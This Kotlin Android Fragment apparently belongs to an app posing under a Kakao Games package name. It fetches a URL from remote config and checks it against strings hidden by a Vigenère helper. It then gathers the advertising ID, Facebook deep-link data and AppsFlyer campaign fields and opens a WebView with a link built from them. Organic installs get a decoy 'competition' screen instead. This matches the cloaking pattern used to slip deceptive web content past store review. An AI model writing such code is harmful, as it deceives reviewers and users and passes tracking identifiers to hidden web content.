package com.kakaogames.gd.ui

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.appcompat.app.AlertDialog
import androidx.fragment.app.Fragment
import androidx.fragment.app.viewModels
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.lifecycleScope
import androidx.navigation.fragment.findNavController
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.kakaogames.gd.R
import com.kakaogames.gd.databinding.FragmentStartBinding
import com.kakaogames.gd.utils.isInternetAvailable
import com.kakaogames.gd.utils.vigenere
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class StartFragment : Fragment() {
    @Inject
    lateinit var kakAppsFlyerLiveData: MutableLiveData<MutableMap<String, Any>>

    private var _binding: FragmentStartBinding? = null
    private val binding get() = _binding!!

    private val viewModel: StartViewModel by viewModels()

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentStartBinding.inflate(layoutInflater)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        kakInitLoading()
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }


    private fun kakInitLoading() {
        binding.pBar.visibility = View.VISIBLE
        val link = viewModel.kakGetCachedLink()

        if (isInternetAvailable(requireContext())) {
            if (link != "") {
                kakNavigateToWebViewFragment(link)
                binding.pBar.visibility = View.GONE
            } else {
                kakStartInitFirebase()
            }
        } else {
            kakShowNoInternetDialog()
            binding.pBar.visibility = View.GONE
        }
    }

    private fun kakStartInitFirebase() {
        val remoteConfig = FirebaseRemoteConfig.getInstance()
        val settings =
            FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(2500)
                .build()
        remoteConfig.setConfigSettingsAsync(settings)
        remoteConfig.fetchAndActivate().addOnCompleteListener {
            val organic = remoteConfig.getBoolean(resources.getString(R.string.firebase_organic))
            val url = remoteConfig.getString(resources.getString(R.string.firebase_root_url))
            viewModel.kakSetOrganicAndUrl(organic, url)
            if (url.contains("jhfz".vigenere())) {
                kakBeginMainWork()
            } else {
                kakNavigateToCompetitionFragment()
            }
        }
    }

    private fun kakBeginMainWork() = lifecycleScope.launch(Dispatchers.IO) {
        kakInitFB()
        kakGetGoogleAID()
        lifecycleScope.launch(Dispatchers.Main) {
            kakSetAppsFlyerParams()
        }
    }

    private fun kakInitFB() {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(requireContext()) {
            val uri = it?.targetUri
            viewModel.kakSetDeepLink(uri)
        }
    }

    private fun kakGetGoogleAID() {
        val advertisingIdClient = AdvertisingIdClient.getAdvertisingIdInfo(requireContext())
        viewModel.kakSetGoogleAID(advertisingIdClient.id.toString())
    }

    private fun kakSetAppsFlyerParams() {
        val appsUID = AppsFlyerLib.getInstance().getAppsFlyerUID(requireContext())
        viewModel.kakSetAppsFlyerUID(appsUID)

        kakAppsFlyerLiveData.observe(viewLifecycleOwner) {
            for (inform in it) {
                when (inform.key) {
                    "ct_edadug".vigenere() -> {
                        viewModel.kakSetAppsFlyerStatus(inform.value.toString())
                    }
                    "eoyzasgb".vigenere() -> {
                        viewModel.kakSetAppsFlyerCampaign(inform.value.toString())
                    }
                    "ospsa_coixcq".vigenere() -> {
                        viewModel.kakSetAppsFlyerMediaSource(inform.value.toString())
                    }
                    "ct_oraxnsr".vigenere() -> {
                        viewModel.kakSetAppsFlyerChannel(inform.value.toString())
                    }
                }
            }
            kakCollectWebLink()
        }
    }


    private fun kakCollectWebLink() {
        val organicAccess = viewModel.kakGetOrganicAccess()
        val mediaSource = viewModel.kakGetMediaSource()
        if (organicAccess == false && mediaSource == "qfsknsc".vigenere()) {
            kakNavigateToCompetitionFragment()
            return
        }
        val link = viewModel.kakCollectWebLink(requireContext())
        kakNavigateToWebViewFragment(link)
    }


    private fun kakNavigateToWebViewFragment(link: String) {
        val action = StartFragmentDirections.actionStartFragmentToWebViewFragment(link)
        findNavController().navigate(action)
    }

    private fun kakNavigateToCompetitionFragment() {
        val action = StartFragmentDirections.actionGlobalCompetitionFragment()
        findNavController().navigate(action)
    }


    private fun kakShowNoInternetDialog(): AlertDialog =
        MaterialAlertDialogBuilder(requireContext()).setTitle("No internet connection")
            .setMessage("Check your internet connection and try again later")
            .setCancelable(false)
            .setPositiveButton("Try again") { dialog, _ ->
                kakInitLoading()
                dialog.dismiss()
            }
            .show()
}